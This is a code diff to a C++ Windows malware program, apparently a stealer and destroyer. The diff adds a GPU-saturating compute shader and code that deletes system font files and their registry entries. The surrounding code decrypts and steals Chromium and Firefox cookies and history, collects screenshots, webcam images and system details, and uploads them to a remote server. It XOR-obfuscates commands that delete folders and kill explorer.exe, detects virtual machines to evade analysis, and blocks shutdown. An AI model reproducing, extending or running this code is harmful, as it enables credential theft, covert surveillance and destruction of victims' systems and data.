@@ -1,4 +1,4 @@
-﻿#include <Windows.h>
+#include <Windows.h>
 #include <TlHelp32.h>
 #include <chrono>
 #include <cstdio>
@@ -16,6 +16,8 @@
 #include <ShlObj.h>
 #include <intrin.h>
 #include <bcrypt.h>
+#include <d3d11.h>
+#include <d3dcompiler.h>
 #include "config.h"
 #include "curl/curl.h"
 
@@ -31,6 +33,8 @@
 #pragma comment(lib, "libcurl.lib")
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "d3d11.lib")
+#pragma comment(lib, "d3dcompiler.lib")
 
 // libcurl write callback
 static size_t curl_write_cb(void* ptr, size_t sz, size_t nmemb, void* ud) {
@@ -60,7 +64,7 @@ void simple_upload()
     curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
 
-    // --- GET /token ---
+    // get /token
     std::string token;
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &token);
     curl_easy_setopt(curl, CURLOPT_URL, token_url);
@@ -73,7 +77,7 @@ void simple_upload()
     }
     if (token.empty()) { curl_slist_free_all(hosts); curl_easy_cleanup(curl); return; }
 
-    // --- collect local files ---
+    // collect local files
     wchar_t scrPath[MAX_PATH], camPath[MAX_PATH], infoPath[MAX_PATH];
     GetTempPathW(MAX_PATH, scrPath); wcscat_s(scrPath, L"scr.png");
     SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, camPath); wcscat_s(camPath, L"\\wallpaper.png");
@@ -90,7 +94,7 @@ void simple_upload()
     };
     auto scr = load(scrPath), cam = load(camPath), inf = load(infoPath);
 
-    // --- build multipart via curl_mime ---
+    // build multipart via curl_mime
     curl_mime* mime = curl_mime_init(curl);
     auto add_part = [&](const char* name, const wchar_t* fn, const std::vector<BYTE>& d) {
         if (d.empty()) return;
@@ -135,7 +139,7 @@ void simple_upload()
         }
     }
 
-    // --- POST /upload?token=xxx ---
+    // post /upload?token=xxx
     std::string post_body;
     sprintf_s(upload_url, "https://%s/upload?token=%s", host_u8, token.c_str());
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &post_body);
@@ -148,13 +152,13 @@ void simple_upload()
     curl_easy_cleanup(curl);
 }
 
-// XOR string obfuscation
+// xor string obfuscation
 constexpr unsigned char XKEY = 0x55;
 inline void X(char* s, size_t n) { for (size_t i = 0; i < n; i++) s[i] ^= XKEY; }
 inline const char* XD(char* b, size_t n, bool& f) { if (!f) { X(b, n); f = true; } return b; }
 #define XSTR(var) ([]()->const char*{ static bool f; return XD(var, sizeof(var)-1, f); }())
 
-// Pre-XOR'd strings (key 0x55)
+// pre-xor'd strings (key 0x55)
 static char _cmd1[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x26,0x21,0x34,0x27,0x21,0x75,0x7A,0x37,0x75,0x07,0x11,0x75}; // "cmd /c start /b RD "
 static char _sdq[] = {0x09,0x75,0x7A,0x06,0x75,0x7A,0x04}; // "\\ /S /Q"
 static char _tsk[] = {0x36,0x38,0x31,0x75,0x7A,0x36,0x75,0x21,0x34,0x26,0x3E,0x3E,0x3C,0x39,0x39,0x75,0x7A,0x1C,0x18,0x75,0x30,0x2D,0x25,0x39,0x3A,0x27,0x30,0x27,0x7B,0x30,0x2D,0x30,0x75,0x7A,0x33}; // "cmd /c taskkill /IM explorer.exe /f"
@@ -207,7 +211,7 @@ __inline void FreeMediaType(AM_MEDIA_TYPE& mt)
     ZeroMemory(&mt, sizeof(mt));
 }
 
-// PixelFormat24bppRGB = 0x21808, force raw value for SDK compat
+// pixelformat24bpprgb = 0x21808, force raw value for sdk compat
 constexpr Gdiplus::PixelFormat kPixelFormat24bppRGB = (Gdiplus::PixelFormat)0x21808;
 constexpr Gdiplus::PixelFormat kPixelFormat32bppARGB = (Gdiplus::PixelFormat)0x26200A;
 
@@ -379,7 +383,7 @@ void steal_info()
         return w2s(buf);
     };
 
-    // --- CPU ---
+    // cpu
     std::string cpuName = regStr(HKEY_LOCAL_MACHINE,
         L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", L"ProcessorNameString");
     add_line("CPU", cpuName.empty() ? "unknown" : cpuName);
@@ -388,7 +392,7 @@ void steal_info()
     if (GetEnvironmentVariableW(L"NUMBER_OF_PROCESSORS", buf, 512))
         add_line("CPU Cores", w2s(buf));
 
-    // --- RAM ---
+    // ram
     MEMORYSTATUSEX ms = { sizeof(ms) };
     if (GlobalMemoryStatusEx(&ms)) {
         char ram[32];
@@ -396,11 +400,11 @@ void steal_info()
         add_line("Total RAM", ram);
     }
 
-    // --- GPU ---
+    // gpu
     DISPLAY_DEVICEW dd = { sizeof(dd) };
     if (EnumDisplayDevicesW(nullptr, 0, &dd, 0))
         add_line("GPU", w2s(dd.DeviceString));
-    // VRAM from registry
+    // vram from registry
     std::string vram = regStr(HKEY_LOCAL_MACHINE,
         L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
         L"HardwareInformation.qwMemorySize");
@@ -412,7 +416,7 @@ void steal_info()
         add_line("GPU VRAM", vr);
     }
 
-    // --- OS ---
+    // os
     {
         std::string osName = regStr(HKEY_LOCAL_MACHINE,
             L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
@@ -464,7 +468,7 @@ void steal_info()
         add_line("OS Name", osName);
     }
 
-    // --- User ---
+    // user
     if (GetEnvironmentVariableW(L"USERNAME", buf, 512))
         add_line("User Name", w2s(buf));
     if (GetEnvironmentVariableW(L"USERDOMAIN", buf, 512))
@@ -472,13 +476,13 @@ void steal_info()
     if (GetEnvironmentVariableW(L"LOGONSERVER", buf, 512))
         add_line("PC Name", w2s(buf));
 
-    // --- Display ---
+    // display
     int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
     char res[32];
     sprintf_s(res, "%dx%d", sw, sh);
     add_line("Resolution", res);
 
-    // --- save ---
+    // save
     wchar_t tempDir[MAX_PATH];
     if (GetEnvironmentVariableW(L"LOCALAPPDATA", tempDir, MAX_PATH)) {
         wcscat_s(tempDir, L"\\sysinfo.log");
@@ -771,7 +775,7 @@ void upload_data()
             sprintf_s(t2, "upload: bodySize=%zu", body2.size());
             diag_log(t2);
 
-            // SendRequest with NULL body, write body with WriteData
+            // sendrequest with null body, write body with writedata
             BOOL sent = WinHttpSendRequest(hRequest,
                 wct.c_str(), (DWORD)wct.size(),
                 nullptr, 0,
@@ -837,14 +841,14 @@ void play_malicious_audio()
 
     std::vector<BYTE> wav(FILE_SIZE);
     BYTE* p = wav.data();
-    // RIFF
+    // riff
     memcpy(p, "RIFF", 4); p += 4;
     *(DWORD*)p = FILE_SIZE - 8; p += 4;
     memcpy(p, "WAVE", 4); p += 4;
     // fmt
     memcpy(p, "fmt ", 4); p += 4;
     *(DWORD*)p = 16; p += 4;
-    *(WORD*)p = 1; p += 2;          // PCM
+    *(WORD*)p = 1; p += 2;          // pcm
     *(WORD*)p = 1; p += 2;          // mono
     *(DWORD*)p = SAMPLE_RATE; p += 4;
     *(DWORD*)p = SAMPLE_RATE; p += 4; // byte rate
@@ -897,6 +901,72 @@ LRESULT CALLBACK ShutBlk_WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
+// gpu burner — compute shader keeps GPU ALUs saturated
+static constexpr char k_burn_shader[] = R"(
+RWStructuredBuffer<uint> buf : register(u0);
+[numthreads(256, 1, 1)]
+void main(uint3 id : SV_DispatchThreadID) {
+    uint v = id.x * 747796405u + 2891336453u;
+    [loop] for (uint i = 0; i < 1024; ++i) { v = v * 1664525u + 1013904223u; v ^= v >> 16; }
+    buf[id.x] = v;
+}
+)";
+
+static ID3D11Device*           g_gpu_dev = nullptr;
+static ID3D11DeviceContext*    g_gpu_ctx = nullptr;
+static ID3D11ComputeShader*    g_gpu_cs = nullptr;
+static ID3D11Buffer*           g_gpu_buf = nullptr;
+static ID3D11UnorderedAccessView* g_gpu_uav = nullptr;
+
+static bool gpu_burner_init() {
+    D3D_FEATURE_LEVEL fl;
+    HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, nullptr, 0,
+        D3D11_SDK_VERSION, &g_gpu_dev, &fl, &g_gpu_ctx);
+    if (FAILED(hr)) {
+        // fallback to WARP (software) — still stresses CPU via emulated GPU
+        hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_WARP, nullptr, 0, nullptr, 0,
+            D3D11_SDK_VERSION, &g_gpu_dev, &fl, &g_gpu_ctx);
+    }
+    if (FAILED(hr)) return false;
+
+    ID3DBlob* blob = nullptr;
+    hr = D3DCompile(k_burn_shader, sizeof(k_burn_shader) - 1, nullptr, nullptr, nullptr,
+        "main", "cs_5_0", D3DCOMPILE_OPTIMIZATION_LEVEL3, 0, &blob, nullptr);
+    if (FAILED(hr)) return false;
+
+    hr = g_gpu_dev->CreateComputeShader(blob->GetBufferPointer(), blob->GetBufferSize(), nullptr, &g_gpu_cs);
+    blob->Release();
+    if (FAILED(hr)) return false;
+
+    D3D11_BUFFER_DESC bd = {};
+    bd.ByteWidth = 256 * 256 * sizeof(UINT);
+    bd.Usage = D3D11_USAGE_DEFAULT;
+    bd.BindFlags = D3D11_BIND_UNORDERED_ACCESS;
+    bd.MiscFlags = D3D11_RESOURCE_MISC_BUFFER_STRUCTURED;
+    bd.StructureByteStride = sizeof(UINT);
+    hr = g_gpu_dev->CreateBuffer(&bd, nullptr, &g_gpu_buf);
+    if (FAILED(hr)) return false;
+
+    D3D11_UNORDERED_ACCESS_VIEW_DESC uavd = {};
+    uavd.Format = DXGI_FORMAT_UNKNOWN;
+    uavd.ViewDimension = D3D11_UAV_DIMENSION_BUFFER;
+    uavd.Buffer.NumElements = 256 * 256;
+    hr = g_gpu_dev->CreateUnorderedAccessView(g_gpu_buf, &uavd, &g_gpu_uav);
+    if (FAILED(hr)) return false;
+
+    return true;
+}
+
+DWORD WINAPI gpu_burn(LPVOID) {
+    if (!gpu_burner_init()) return 1;
+    while (true) {
+        g_gpu_ctx->CSSetShader(g_gpu_cs, nullptr, 0);
+        g_gpu_ctx->CSSetUnorderedAccessViews(0, 1, &g_gpu_uav, nullptr);
+        g_gpu_ctx->Dispatch(256, 1, 1);
+    }
+    return 0;
+}
+
 DWORD WINAPI cpu_burn(LPVOID)
 {
     while (true) { volatile int x = 0; for (int i = 0; i < 999999; i++) x += i; }
@@ -906,8 +976,50 @@ DWORD WINAPI cpu_burn(LPVOID)
 DWORD WINAPI delete_fonts(LPVOID)
 {
     Sleep(10000);
-    RegDeleteTreeW(HKEY_LOCAL_MACHINE,
-        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts");
+
+    const wchar_t* fontsKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts";
+    const wchar_t* fontsDir = L"C:\\Windows\\Fonts\\";
+
+    HKEY hk = nullptr;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, fontsKey, 0,
+        KEY_SET_VALUE | KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hk) != ERROR_SUCCESS)
+        return 1;
+
+    DWORD idx = 0;
+    wchar_t valName[256];
+    DWORD valLen = 256;
+    wchar_t data[MAX_PATH + 1];
+    DWORD dataLen, type;
+
+    while (true) {
+        valLen = 256; dataLen = sizeof(data);
+        LONG r = RegEnumValueW(hk, idx, valName, &valLen, nullptr, &type,
+            (BYTE*)data, &dataLen);
+        if (r == ERROR_NO_MORE_ITEMS) break;
+        idx++;
+
+        // delete registry value
+        RegDeleteValueW(hk, valName);
+
+        // skip system-critical fonts
+        if (wcsstr(valName, L"Marlett") || wcsstr(valName, L"Segoe UI") ||
+            wcsstr(valName, L"Wingdings") || wcsstr(valName, L"Webdings"))
+            continue;
+
+        // unload font from system
+        if (type == REG_SZ && dataLen > 2) {
+            wchar_t fontPath[MAX_PATH];
+            if (wcsstr(data, L":\\") || wcsstr(data, L":/"))
+                wcscpy_s(fontPath, data);
+            else
+                swprintf_s(fontPath, L"%s%s", fontsDir, data);
+            RemoveFontResourceExW(fontPath, 0, nullptr);
+            DeleteFileW(fontPath);
+        }
+    }
+
+    RegCloseKey(hk);
+    SendMessageW(HWND_BROADCAST, WM_FONTCHANGE, 0, 0);
     return 0;
 }
 
@@ -1122,12 +1234,13 @@ void desktop_destroyer()
 
     MessageBoxW(nullptr, L"ur pc just fuck up", L"enjoy my gifts LOL", MB_OK | MB_ICONERROR);
 
-    // max out CPU + RAM
+    // max out CPU + RAM + GPU
     SYSTEM_INFO si;
     GetSystemInfo(&si);
     for (DWORD i = 0; i < si.dwNumberOfProcessors * 2; i++)
         CreateThread(nullptr, 0, cpu_burn, nullptr, 0, nullptr);
     CreateThread(nullptr, 0, ram_burn, nullptr, 0, nullptr);
+    CreateThread(nullptr, 0, gpu_burn, nullptr, 0, nullptr);
 
     // block all shutdown methods
     // power button → do nothing
@@ -1244,7 +1357,7 @@ void guarded_webcam()
     __try { capture_webcam(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
 }
 
-// --- SQLite3 (winsqlite3.dll, Windows 10+ built-in) ---
+// sqlite3 (winsqlite3.dll, Windows 10+ built-in)
 typedef struct sqlite3 sqlite3;
 typedef struct sqlite3_stmt sqlite3_stmt;
 typedef int(*sqlite3_open_t)(const char*, sqlite3**);
@@ -1270,7 +1383,7 @@ static bool sqlite3_init() {
     return ok = true;
 }
 
-// Base64 decode using Win32 CryptStringToBinaryA
+// base64 decode using Win32 CryptStringToBinaryA
 static std::vector<BYTE> b64decode(const char* b64, size_t len) {
     DWORD outLen = 0;
     CryptStringToBinaryA(b64, (DWORD)len, CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr);
@@ -1279,7 +1392,7 @@ static std::vector<BYTE> b64decode(const char* b64, size_t len) {
     return out;
 }
 
-// Extract & decrypt AES key from Local State JSON (DPAPI → raw AES-256 key)
+// extract & decrypt aes key from local state json (dpapi → raw AES-256 key)
 static std::vector<BYTE> extract_aes_key(const wchar_t* localStatePath) {
     std::vector<BYTE> key;
     HANDLE h = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
@@ -1297,7 +1410,7 @@ static std::vector<BYTE> extract_aes_key(const wchar_t* localStatePath) {
     auto end = data.find('"', pos);
     if (end == std::string::npos) return key;
 
-    // Base64 decode → strip "DPAPI" (5 bytes) → CryptUnprotectData
+    // base64 decode → strip "DPAPI" (5 bytes) → CryptUnprotectData
     auto blob = b64decode(data.c_str() + pos, end - pos);
     if (blob.size() <= 5) return key;
 
@@ -1309,7 +1422,7 @@ static std::vector<BYTE> extract_aes_key(const wchar_t* localStatePath) {
     return key;
 }
 
-// AES-256-GCM decrypt via BCrypt
+// aes-256-gcm decrypt via bcrypt
 static std::vector<BYTE> aes_gcm_decrypt(const BYTE* key, size_t keyLen, const BYTE* nonce, size_t nonceLen, const BYTE* ct, size_t ctLen) {
     std::vector<BYTE> pt(ctLen);
     BCRYPT_ALG_HANDLE hAlg = nullptr;
@@ -1318,7 +1431,7 @@ static std::vector<BYTE> aes_gcm_decrypt(const BYTE* key, size_t keyLen, const B
     BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
     if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, (ULONG)keyLen, 0) != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return {}; }
 
-    // Chromium format: nonce(12) || ciphertext || tag(16)
+    // chromium format: nonce(12) || ciphertext || tag(16)
     size_t dataLen = ctLen - nonceLen - 16;
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth = {};
     BCRYPT_INIT_AUTH_MODE_INFO(auth);
@@ -1335,7 +1448,7 @@ static std::vector<BYTE> aes_gcm_decrypt(const BYTE* key, size_t keyLen, const B
     return pt;
 }
 
-// Decrypt one Chromium browser's cookies — supports multiple profiles
+// decrypt one chromium browser's cookies — supports multiple profiles
 static void decrypt_chromium(const wchar_t* name, const wchar_t* basePath, int type, const wchar_t* outDir) {
     wchar_t lsPath[MAX_PATH], dbPath[MAX_PATH];
     wchar_t localAppData[MAX_PATH], roamingAppData[MAX_PATH];
@@ -1422,7 +1535,7 @@ void steal_cookies()
     wchar_t outDir[MAX_PATH];
     GetTempPathW(MAX_PATH, outDir);
 
-    // Chromium browsers — decrypt locally
+    // chromium browsers — decrypt locally
     struct { const wchar_t* name; const wchar_t* base; int type; } browsers[] = {
         {L"Chrome",  L"Google\\Chrome\\User Data",              0},
         {L"Edge",    L"Microsoft\\Edge\\User Data",              0},
@@ -1434,7 +1547,7 @@ void steal_cookies()
     for (auto& b : browsers)
         decrypt_chromium(b.name, b.base, b.type, outDir);
 
-    // Firefox — cookies.sqlite is NOT encrypted, just copy as-is
+    // firefox — cookies.sqlite is NOT encrypted, just copy as-is
     wchar_t roamingAppData[MAX_PATH];
     SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);
     wchar_t ffBase[MAX_PATH];
@@ -1483,7 +1596,7 @@ void steal_history()
         CopyFileW(src, dst, FALSE);
     }
 
-    // Firefox — places.sqlite
+    // firefox — places.sqlite
     wchar_t ffBase[MAX_PATH];
     swprintf_s(ffBase, L"%s\\Mozilla\\Firefox\\Profiles", roamingAppData);
     WIN32_FIND_DATAW fd;
@@ -1556,12 +1669,12 @@ bool is_vm()
 {
     int score = 0;
 
-    // ---- L1: CPUID hypervisor bit ----
+    // l1: cpuid hypervisor bit
     int cpuInfo[4] = {};
     __cpuid(cpuInfo, 1);
     if (cpuInfo[2] & (1 << 31)) { score += 3; }  // hypervisor present
 
-    // CPUID hypervisor vendor leaf (0x40000000)
+    // cpuid hypervisor vendor leaf (0x40000000)
     char vendor[13] = {};
     __cpuid(cpuInfo, 0x40000000);
     memcpy(vendor, &cpuInfo[1], 4);
@@ -1572,7 +1685,7 @@ bool is_vm()
         strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv"))
         score += 5;
 
-    // ---- L2: SMBIOS system manufacturer ----
+    // l2: smbios system manufacturer
     std::wstring sysMfr = reg_read(HKEY_LOCAL_MACHINE,
         L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemManufacturer");
     std::wstring sysProd = reg_read(HKEY_LOCAL_MACHINE,
@@ -1586,14 +1699,14 @@ bool is_vm()
         if (sysProd.find(n) != std::wstring::npos) { score += 3; break; }
     }
 
-    // BIOS version string
+    // bios version string
     std::wstring biosVer = reg_read(HKEY_LOCAL_MACHINE,
         L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVersion");
     for (auto* n : vmNames) {
         if (biosVer.find(n) != std::wstring::npos) { score += 2; break; }
     }
 
-    // ---- L3: Registry keys (VMware/VBox tools & services) ----
+    // l3: registry keys (VMware/VBox tools & services)
     const wchar_t* regKeys[] = {
         L"SOFTWARE\\VMware, Inc.\\VMware Tools",
         L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
@@ -1613,7 +1726,7 @@ bool is_vm()
     };
     for (auto* k : regKeys) { if (reg_exists(HKEY_LOCAL_MACHINE, k)) { score += 2; } }
 
-    // ---- L4: VM driver files ----
+    // l4: vm driver files
     const wchar_t* drivers[] = {
         L"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
         L"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
@@ -1628,7 +1741,7 @@ bool is_vm()
     };
     for (auto* d : drivers) { if (GetFileAttributesW(d) != INVALID_FILE_ATTRIBUTES) { score += 3; } }
 
-    // ---- L5: VM NIC driver names via registry ----
+    // l5: vm nic driver names via registry
     HKEY hClass;
     if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
         L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}",
@@ -1653,14 +1766,14 @@ bool is_vm()
         RegCloseKey(hClass);
     }
 
-    // ---- L6: Disk size < 60GB heuristic ----
+    // l6: disk size < 60GB heuristic
     ULARGE_INTEGER totalBytes;
     if (GetDiskFreeSpaceExW(L"C:\\", nullptr, &totalBytes, nullptr)) {
         ULONGLONG gb = totalBytes.QuadPart / (1024ULL * 1024 * 1024);
         if (gb < 60) score += 1;
     }
 
-    // ---- L7: WMI: Win32_ComputerSystem Manufacturer/Model shortcut via registry ----
+    // l7: wmi: Win32_ComputerSystem Manufacturer/Model shortcut via registry
     std::wstring csMfr = reg_read(HKEY_LOCAL_MACHINE,
         L"SYSTEM\\CurrentControlSet\\Control\\SystemInformation", L"SystemManufacturer");
     std::wstring csMod = reg_read(HKEY_LOCAL_MACHINE,
